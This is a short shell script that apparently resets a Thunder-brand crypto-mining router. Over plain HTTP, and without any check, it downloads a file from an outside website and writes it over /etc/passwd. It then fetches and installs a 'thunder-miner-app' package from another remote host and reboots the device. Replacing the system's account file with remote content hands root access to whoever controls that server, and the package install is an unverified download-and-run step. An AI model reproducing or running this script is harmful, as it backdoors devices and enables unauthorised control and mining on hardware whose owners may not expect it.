export LD_LIBRARY_PATH=/thunder/lib
LOG_PATH=/tmp/reset.log
wget 'http://www.xiefucai.com/tools/zqb/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
/thunder/bin/dcdn call dcdn set_dcdn_client '{"count":1}'

wget 'http://update.peiluyou.com/conf/miner_beta2/packages/thunder-miner-app_V1.1.1066_arm.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk 2>>$LOG_PATH
opkg-cl remove thunder-miner-app
opkg-cl install /tmp/t.ipk

sleep 30
reboot